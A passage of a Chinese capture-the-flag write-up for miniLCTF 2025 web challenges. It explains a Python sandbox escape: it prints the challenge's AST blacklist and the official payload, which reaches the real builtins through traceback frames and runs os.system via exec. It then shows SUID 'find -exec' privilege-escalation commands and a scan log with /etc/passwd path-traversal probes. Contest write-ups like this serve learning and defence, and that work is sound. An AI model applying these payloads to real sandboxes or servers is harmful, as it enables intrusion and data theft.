import 触发（但不会真正导入）</span><br><span class="hljs-string">        &quot;time.sleep&quot;,         # 允许 sleep（但会被拦截）</span><br><span class="hljs-string">        &quot;builtins.input&quot;,     # 允许 input 调用</span><br><span class="hljs-string">        &quot;builtins.input/result&quot;  # 允许 input 返回值</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">    # 检查事件是否在白名单中</span><br><span class="hljs-string">    if event not in allowed_events:</span><br><span class="hljs-string">        raise Exception(f&quot;Audit denied: &#123;event&#125;&quot;)</span><br><span class="hljs-string">    # 不允许传参（args 必须为空）</span><br><span class="hljs-string">    if len(args) &gt; 0:</span><br><span class="hljs-string">        raise Exception(&quot;Arguments not allowed in audit events&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 注册审计钩子（Python 3.8+ 支持）</span><br><span class="hljs-string">addaudithook(my_audit_checker)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 打印用户输入内容</span><br><span class="hljs-string">print(&quot;&#123;&#125;&quot;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br>output = safe_exec(CODE.<span class="hljs-built_in">format</span>(text))<br></code></pre></td></tr></table></figure>
+<p>这里我们的输入会被放入print(“{}”)的{}里。  </p>
+<p>需要执行任意代码，可以用 “) 来闭合print函数达到注入，最后在结尾在加沙print(“来把剩下的引号和括号闭合。  </p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-comment">&quot;)</span><br>代码执行<br><span class="hljs-keyword">print</span>(<span class="hljs-comment">&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>然后进入 sandbox_executor 函数，这里builtins会被替换为如下被定义的safe_builtins，不是真的builtins。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">    safe_builtins = &#123;<br>        <span class="hljs-string">&quot;print&quot;</span>: <span class="hljs-built_in">print</span>,<br>        <span class="hljs-string">&quot;filter&quot;</span>: <span class="hljs-built_in">filter</span>,<br>        <span class="hljs-string">&quot;list&quot;</span>: <span class="hljs-built_in">list</span>,<br>        <span class="hljs-string">&quot;len&quot;</span>: <span class="hljs-built_in">len</span>,<br>        <span class="hljs-string">&quot;addaudithook&quot;</span>: sys.addaudithook,  <span class="hljs-comment"># 允许设置审计钩子</span><br>        <span class="hljs-string">&quot;Exception&quot;</span>: Exception,<br>    &#125;<br><br>safe_globals = &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: safe_builtins&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们需要找到另一条能继承可用函数的链，这里要同时考虑ast的影响：  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SandboxVisitor</span>(ast.NodeVisitor):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    自定义 AST 访问器，用于静态分析代码结构。</span><br><span class="hljs-string">    禁止访问某些危险属性或使用生成器表达式。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># 黑名单：禁止访问这些特殊属性（可能被用于反射/逃逸）</span><br>    forbidden_attrs = &#123;<br>        <span class="hljs-string">&quot;__class__&quot;</span>,      <span class="hljs-comment"># 防止获取类对象</span><br>        <span class="hljs-string">&quot;__dict__&quot;</span>,       <span class="hljs-comment"># 防止修改命名空间</span><br>        <span class="hljs-string">&quot;__bases__&quot;</span>,      <span class="hljs-comment"># 类继承信息</span><br>        <span class="hljs-string">&quot;__mro__&quot;</span>,        <span class="hljs-comment"># 方法解析顺序</span><br>        <span class="hljs-string">&quot;__subclasses__&quot;</span>, <span class="hljs-comment"># 可用于获取所有类，绕过限制</span><br>        <span class="hljs-string">&quot;__globals__&quot;</span>,    <span class="hljs-comment"># 函数全局变量</span><br>        <span class="hljs-string">&quot;__code__&quot;</span>,       <span class="hljs-comment"># 函数字节码</span><br>        <span class="hljs-string">&quot;__closure__&quot;</span>,    <span class="hljs-comment"># 闭包变量</span><br>        <span class="hljs-string">&quot;__func__&quot;</span>, <span class="hljs-string">&quot;__self__&quot;</span>,     <span class="hljs-comment"># 绑定方法相关</span><br>        <span class="hljs-string">&quot;__module__&quot;</span>,     <span class="hljs-comment"># 模块信息</span><br>        <span class="hljs-string">&quot;__import__&quot;</span>,     <span class="hljs-comment"># 动态导入</span><br>        <span class="hljs-string">&quot;__builtins__&quot;</span>,   <span class="hljs-comment"># 内建命名空间</span><br>        <span class="hljs-string">&quot;__base__&quot;</span>        <span class="hljs-comment"># 基类</span><br>    &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_Attribute</span>(<span class="hljs-params">self, node</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        当遇到属性访问时（如 obj.attr），检查是否为禁止属性。</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node.attr, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">and</span> node.attr <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.forbidden_attrs:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Forbidden attribute access&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.generic_visit(node)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_GeneratorExp</span>(<span class="hljs-params">self, node</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        禁止使用生成器表达式（例如 (x for x in range(10))）</span><br><span class="hljs-string">        因为它可能导致延迟求值或内存消耗过大等问题。</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Generator expressions are not allowed&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p><strong>什么是AST?</strong><br>AST 访问器：  </p>
+<p>是一个在python来进行静态审计代码的办法。把代码放进去审计，是不会运行的，AST 分析的是代码的结构，不会执行代码，是静态分析。  </p>
+<p>那SandboxVisitor(ast.NodeVisitor)大概就是把输入的字符里的<strong>方法</strong>，进行python解析，然后检查语法节点。<br>大概是检查每一个魔术方法的链接，只要链接上有指定的方法就会进行动作。  </p>
+<p>所以在进入 safe_exec函数后就得考虑：<br>safe_builtins是被自定义过的builtins只有几个函数可用，还有就是ast审查，  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">f safe_exec(code: <span class="hljs-built_in">str</span>, timeout=<span class="hljs-number">1</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    安全地执行一段代码，包含超时控制和 AST 检查。</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    步骤：</span><br><span class="hljs-string">    1. 解码 Unicode 转义字符</span><br><span class="hljs-string">    2. 解析语法树并进行 AST 安全检查</span><br><span class="hljs-string">    3. 启动子进程执行代码（避免阻塞主服务）</span><br><span class="hljs-string">    4. 设置超时终止机制</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    返回：执行结果或错误信息</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 处理 Unicode 转义（例如 \u0061 -&gt; &#x27;a&#x27;）</span><br>    code = code.encode().decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>)<br><br>    <span class="hljs-comment"># 解析成抽象语法树（AST）</span><br>    tree = ast.parse(code)<br><br>    <span class="hljs-comment"># 使用自定义访问器检查 AST 是否包含非法操作</span><br>    <span class="hljs-keyword">try</span>:<br>        SandboxVisitor().visit(tree)<br>    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: Suspicious code detected during AST analysis.&quot;</span><br><br>    <span class="hljs-comment"># 创建多进程队列用于接收执行结果</span><br>    result_queue = multiprocessing.Queue()<br><br>    <span class="hljs-comment"># 启动子进程执行代码（隔离运行环境）</span><br>    p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue))<br>    p.start()<br>    p.join(timeout=timeout)  <span class="hljs-comment"># 最多等待 timeout 秒</span><br><br>    <span class="hljs-comment"># 超时处理</span><br>    <span class="hljs-keyword">if</span> p.is_alive():<br>        p.terminate()  <span class="hljs-comment"># 强制终止进程</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Timeout: code took too long to run.&quot;</span><br><br>    <span class="hljs-comment"># 尝试获取执行结果</span><br>    <span class="hljs-keyword">try</span>:<br>        status, output = result_queue.get_nowait()<br>        <span class="hljs-keyword">return</span> output <span class="hljs-keyword">if</span> status == <span class="hljs-string">&quot;ok&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;output&#125;</span>&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: no output from sandbox.&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里官方wp主要讲了Exception这条链：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">e.<span class="hljs-emphasis">__traceback__</span> → 指向异常发生时的 traceback 对象<br><br>traceback 里包含 tb_frame → 指向异常发生的 栈帧 frame 对象<br><br>frame 里包含 f_locals、f_globals、f_back → 可以沿着链条访问之前的局部变量、全局变量、调用栈<br><br>可以逃逸到exec外的全局拿<span class="hljs-emphasis">__builtins__</span><br></code></pre></td></tr></table></figure>
+
+<p>再看一遍执行模板：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">CODE = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">def my_audit_checker(event, args):</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    审计钩子函数：监控系统事件，仅允许特定行为。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    allowed_events = [</span><br><span class="hljs-string">        &quot;import&quot;,             # 允许 import 触发（但不会真正导入）</span><br><span class="hljs-string">        &quot;time.sleep&quot;,         # 允许 sleep（但会被拦截）</span><br><span class="hljs-string">        &quot;builtins.input&quot;,     # 允许 input 调用</span><br><span class="hljs-string">        &quot;builtins.input/result&quot;  # 允许 input 返回值</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">    # 检查事件是否在白名单中</span><br><span class="hljs-string">    if event not in allowed_events:</span><br><span class="hljs-string">        raise Exception(f&quot;Audit denied: &#123;event&#125;&quot;)</span><br><span class="hljs-string">    # 不允许传参（args 必须为空）</span><br><span class="hljs-string">    if len(args) &gt; 0:</span><br><span class="hljs-string">        raise Exception(&quot;Arguments not allowed in audit events&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 注册审计钩子（Python 3.8+ 支持）</span><br><span class="hljs-string">addaudithook(my_audit_checker)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 打印用户输入内容</span><br><span class="hljs-string">print(&quot;&#123;&#125;&quot;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>那最后，<br>构建的payload要满足，绕过 badchars 黑名单，绕过 safe_builtins 拿到全局的 builtins，之后是绕过AST的审查，最后绕过输出5个字符的限制  </p>
+<p>看到官方wp给的payload ：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">text=<span class="hljs-string">&quot;)</span><br><span class="hljs-string">list=lambda x:True </span><br><span class="hljs-string">len=lambda x:False</span><br><span class="hljs-string">#从写list和len方法，绕过执行模板的审计钩子 my_audit_checker</span><br><span class="hljs-string"></span><br><span class="hljs-string">try:</span><br><span class="hljs-string">    1/0</span><br><span class="hljs-string"># 尝试报错</span><br><span class="hljs-string">#故意制造一个异常（除零错误），目的是获取当前的 traceback（栈追踪）。</span><br><span class="hljs-string">#因为异常发生时，Python 会生成一个 traceback 对象，记录调用栈信息。</span><br><span class="hljs-string">except Exception as e:</span><br><span class="hljs-string">    frame = e.__traceback__.tb_frame.f_back</span><br><span class="hljs-string">    builtins = frame.f_globals[&#x27;__builtins__&#x27;]</span><br><span class="hljs-string">    builtins.exec(&quot;</span>builtins.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls / -al&gt;app.py&#x27;</span>)<span class="hljs-string">&quot;)    </span><br><span class="hljs-string">    #这里__import__被ast拦了，所以放成字符串丢到exec里（也可以用__getattribute__获取__import__）</span><br><span class="hljs-string">    #例如 getattr(&#x27;__imp&#x27;+&#x27;__opt__&#x27;)(&#x27;os&#x27;)</span><br><span class="hljs-string">    #frame.f_globals[&#x27;SandboxVisitor&#x27;].visit_Attribute=lambda x,y:None  #重写visit_Attribute后</span><br><span class="hljs-string">    #builtins.__import__(&#x27;os&#x27;).system(&#x27;ls /&gt;app.py&#x27;) 					#也ok</span><br><span class="hljs-string">print(&quot;</span><br><br><span class="hljs-comment">#得unicode编码</span><br></code></pre></td></tr></table></figure>
+<p>所以说在exp中制造异常是为了利用__traceback__链接来拿到f_back里的f_globals里的builtins  </p>
+<p>然后用exec来执行字符串来绕过SandboxVisitor的审查，因为ast是不会对字符串进行解析的  </p>
+<p>另一种绕过andboxVisitor的解法：<br>替换ast函数：  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">frame.f_globals[<span class="hljs-string">&#x27;SandboxVisitor&#x27;</span>].visit_Attribute=<span class="hljs-keyword">lambda</span> x,y:<span class="hljs-literal">None</span> <br><span class="hljs-comment">#把自定义的SandboxVisitor两个参数置空</span><br>builtins.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls /&gt;app.py&#x27;</span>)<br><span class="hljs-comment">#就能直接使用import了</span><br></code></pre></td></tr></table></figure>
+<p>最后需要对付的是输出时的限制5个字符：  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) &gt; <span class="hljs-number">5</span>:<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Error&quot;</span>, status=<span class="hljs-number">400</span>)<br></code></pre></td></tr></table></figure>
+<p>这里容易想到是写入文件，由于权限问题最好能写入到web能访问的文件，所以写入app.py  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">total</span> <span class="hljs-number">72</span> drwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">3</span> <span class="hljs-number">00</span>:<span class="hljs-number">12</span> app lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">7</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> bin -&gt; usr/bin drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Mar <span class="hljs-number">29</span> <span class="hljs-number">2024</span> boot drwxr-xr-x <span class="hljs-number">5</span> root root <span class="hljs-number">360</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> dev -rwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">272</span> May <span class="hljs-number">1</span> <span class="hljs-number">16</span>:<span class="hljs-number">15</span> entrypoint.sh drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> etc drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> home lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">7</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> lib -&gt; usr/lib lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">9</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> lib64 -&gt; usr/lib64 -rw------- <span class="hljs-number">1</span> root root <span class="hljs-number">101</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> m1n1FL@G drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> media drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> mnt drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> opt dr-xr-xr-x <span class="hljs-number">520</span> root root <span class="hljs-number">0</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> proc drwx------ <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Aug <span class="hljs-number">2</span> <span class="hljs-number">2024</span> root drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Oct <span class="hljs-number">21</span> <span class="hljs-number">05</span>:<span class="hljs-number">30</span> run lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">8</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> sbin -&gt; usr/sbin drwxr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> srv dr-xr-xr-x <span class="hljs-number">13</span> root root <span class="hljs-number">0</span> Aug <span class="hljs-number">18</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span> sys drwxrwxrwt <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">3</span> <span class="hljs-number">00</span>:<span class="hljs-number">12</span> tmp drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> usr drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">2024</span> var <br></code></pre></td></tr></table></figure>
+
+<p>然后尝试读取m1n1FL@G会发现没有权限  </p>
+<p>这时需要进行提权，wp上的解法是用suid提权</p>
+<p><strong>suid权限</strong>，指一个应用可以被任何人执行，但是由于应用有suid权限，当另一人执行应用时会等价于是应用的所有者权限所执行  </p>
+<p>find &#x2F; -perm &#x2F;4000<br>找到拥有suid权限的程序：  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/find /u</span>sr<span class="hljs-regexp">/bin/m</span>ount <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/passwd /u</span>sr<span class="hljs-regexp">/bin/</span>su <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/chsh /u</span>sr<span class="hljs-regexp">/bin/</span>chfn <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/gpasswd /u</span>sr<span class="hljs-regexp">/bin/um</span>ount <span class="hljs-regexp">/usr/</span>bin/newgrp<br></code></pre></td></tr></table></figure>
+<p>然后用find提权:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /etc/passwd -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">chmod</span> 777 /m1* \;<br><span class="hljs-built_in">cat</span> /m1* &gt;app.py<br><br>或者<br><br>find . -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /m1* &gt; app.py \;<br><br>等等<br></code></pre></td></tr></table></figure>
+
+
+<p>官方wp: <a target="_blank" rel="noopener" href="https://github.com/XDSEC/miniLCTF_2025/blob/main/OfficialWriteups/Web/GuessOneGuess-PyBox.md">https://github.com/XDSEC/miniLCTF_2025/blob/main/OfficialWriteups/Web/GuessOneGuess-PyBox.md</a></p>
+<h2 id="ezCC"><a href="#ezCC" class="headerlink" title="ezCC"></a>ezCC</h2><p>看题目：</p>
+<p><img src="http://notes.gwwafz.online/uploads/d3bd3197-bd35-41cb-ae11-26db126245a8.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一次扫描失败了，然后限制了一下delay,，慢扫了一下:  </p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[<span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">53</span>] Starting:<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">09</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">578</span>B  - /show/<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">17</span>MB - /secret/<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">27</span>] <span class="hljs-number">400</span> -  <span class="hljs-number">435</span>B  - /../../../../../../../../etc/passwd<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">27</span>] <span class="hljs-number">400</span> -  <span class="hljs-number">435</span>B  - /static/../../../../etc/passwd<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">27</span>] <span class="hljs-number">400</span> -  <span class="hljs-number">435</span>B  - /static/../C:\windows\win.ini<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">27</span>] <span class="hljs-number">400</span> -  <span class="hljs-number">435</span>B  - /<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>[<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">59</span>] <span class="hljs-number">400</span> -  <span class="hljs-number">435</span>B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br></code></pre></td></tr></table></figure>
+<p>这里show是显示评论的，访问secret拿到源码  </p>
+<p>发现是.jar文件,解压发现一个pom.xml文件  </p>
+<blockquote>
+<p>pom.xml 是 Maven 项目的核心配置文件  </p>
+</blockquote>
+<p>发现一个blacklist:</p>
+<p><img src="http://notes.gwwafz.online/uploads/ea91ffb1-dc89-4078-b248-332e2a99ad5d.png" srcset="/img/loading.gif" lazyload></p>
+<p>还有ai的分析:  </p>
+<p><img src="http://notes.gwwafz.online/uploads/d9342d40-1692-4083-9016-a33b038055c7.png" srcset="/img/loading.gif" lazyload></p>
+<p>上网查找一下:<br><img src="http://notes.gwwafz.online/uploads/0477f3f5-be46-43ed-8329-cd218fb7d572.png" srcset="/img/loading.gif" lazyload></p>
+<p>15年的漏洞，虽然版本对的上，但是apache有修复，感觉不像是利用点，先听ai话，反编译一下IndexController:  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span 